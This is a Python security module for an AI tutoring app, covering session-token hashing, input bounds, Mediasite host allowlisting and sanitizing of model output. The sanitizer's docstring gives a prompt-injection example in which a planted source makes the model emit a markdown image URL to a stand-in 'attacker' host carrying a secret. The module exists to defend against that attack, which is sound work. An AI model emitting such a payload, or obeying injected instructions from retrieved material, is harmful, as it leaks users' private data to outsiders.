"""Application-enforced security controls. None of these depend on what the model decides to write.

- Session ownership: each session gets a random owner token at creation; only its SHA-256 hash is stored, and
  every request for that session must present the token. This keeps one browser's uploads and chat history
  away from anyone who merely learns or guesses the session id.
- Argument validation: numeric request fields are bounded and prompt sizes are capped.
- Output sanitizing: model output cannot render images or link to URLs that did not appear in the student's
  message or the retrieved material, which closes the usual prompt-injection exfiltration channels.
- Mediasite host allowlisting: server credentials are only ever sent to the configured Mediasite origin.
"""

import hashlib
import hmac
import re
import secrets
from typing import Iterable, Optional
from urllib.parse import urlsplit

SESSION_TOKEN_HEADER = "x-athenai-session-token"
SESSION_ID_REGEX = re.compile(r"[A-Za-z0-9_.-]{1,128}")


def new_session_token() -> str:
    return secrets.token_urlsafe(32)


def hash_session_token(token: str) -> str:
    return hashlib.sha256(token.encode("utf-8")).hexdigest()


def session_token_matches(stored_hash: Optional[str], token: Optional[str]) -> bool:
    if not stored_hash or not token:
        return False
    return hmac.compare_digest(stored_hash, hash_session_token(token))


def valid_session_id(session_id: str) -> bool:
    return bool(SESSION_ID_REGEX.fullmatch(session_id or ""))


def bounded_int(value, default: int, minimum: int, maximum: int, name: str) -> int:
    """Parse an integer request field and clamp it to [minimum, maximum]; raise ValueError when it is not a number."""
    if value is None or value == "":
        return default
    if isinstance(value, bool):
        raise ValueError(f"{name} must be a whole number.")
    try:
        number = int(value)
    except (TypeError, ValueError):
        raise ValueError(f"{name} must be a whole number.") from None
    return max(minimum, min(maximum, number))


MARKDOWN_IMAGE = re.compile(r"!\[([^\]]*)\]\(\s*<?([^)\s>]*)>?(?:\s+\"[^\"]*\")?\s*\)")
MARKDOWN_LINK = re.compile(r"(?<!!)\[([^\]]+)\]\(\s*<?([^)\s>]+)>?(?:\s+\"[^\"]*\")?\s*\)")
MARKDOWN_REFERENCE_DEFINITION = re.compile(r"(?m)^\s{0,3}\[[^\]]+\]:\s*\S+.*$")
HTML_ACTIVE_TAG = re.compile(r"(?is)<\s*(script|iframe|img|object|embed|form|link|meta|style|svg|video|audio|source)\b[^>]*>(?:.*?<\s*/\s*\1\s*>)?")
AUTOLINK = re.compile(r"<((?:https?|ftp|mailto|data|javascript):[^>\s]+)>", re.IGNORECASE)
BARE_URL = re.compile(r"\b(?:https?://|www\.)[^\s<>()\[\]\"']+", re.IGNORECASE)


def _url_is_trusted(url: str, trusted_text: str) -> bool:
    cleaned = url.strip().rstrip(".,;:!?")
    if not cleaned or not re.match(r"(?i)^(?:https?://|www\.)", cleaned):
        return False
    return cleaned in trusted_text


def sanitize_model_output(text: str, trusted_texts: Iterable[str] = ()) -> str:
    """Remove images, active HTML, and links to URLs the student and sources never mentioned.

    A prompt-injected source can ask the model to emit `![x](https://attacker/?q=<secret>)`; browsers fetch images
    automatically, so images are always dropped. Links survive only when the exact URL already appears in the
    student's message or the retrieved material.
    """
    if not text:
        return text
    trusted_text = "\n".join(str(item or "") for item in trusted_texts)
    text = HTML_ACTIVE_TAG.sub("", text)
    text = MARKDOWN_IMAGE.sub(lambda match: match.group(1).strip(), text)
    text = MARKDOWN_REFERENCE_DEFINITION.sub("", text)

    def link(match: re.Match) -> str:
        label, url = match.group(1), match.group(2)
        return match.group(0) if _url_is_trusted(url, trusted_text) else label

    text = MARKDOWN_LINK.sub(link, text)
    text = AUTOLINK.sub(lambda match: match.group(0) if _url_is_trusted(match.group(1), trusted_text) else "[link removed]", text)
    text = BARE_URL.sub(lambda match: match.group(0) if _url_is_trusted(match.group(0), trusted_text) else "[link removed]", text)
    return text


def url_origin(url: str) -> tuple[str, str, Optional[int]]:
    parts = urlsplit(url)
    port = parts.port or {"http": 80, "https": 443}.get(parts.scheme.lower())
    return parts.scheme.lower(), (parts.hostname or "").lower(), port


def same_origin(url: str, root: str) -> bool:
    return url_origin(url) == url_origin(root)


def mediasite_host_allowed(base_url: str, configured_base_url: Optional[str], allowed_hosts: Iterable[str]) -> bool:
    """A request-supplied Mediasite URL must use https and match the configured host or an allowlisted host."""
    scheme, host, _port = url_origin(base_url)
    if scheme != "https" or not host:
        return False
    allowed = {item.strip().lower() for item in allowed_hosts if item and item.strip()}
    if configured_base_url:
        allowed.add(url_origin(configured_base_url)[1])
    return host in allowed


SESSION_PATH = re.compile(r"^(/session/)[^/]+")


def redact_path(path: str) -> str:
    """Keep session ids out of request logs."""
    return SESSION_PATH.sub(r"\1{id}", path or "")
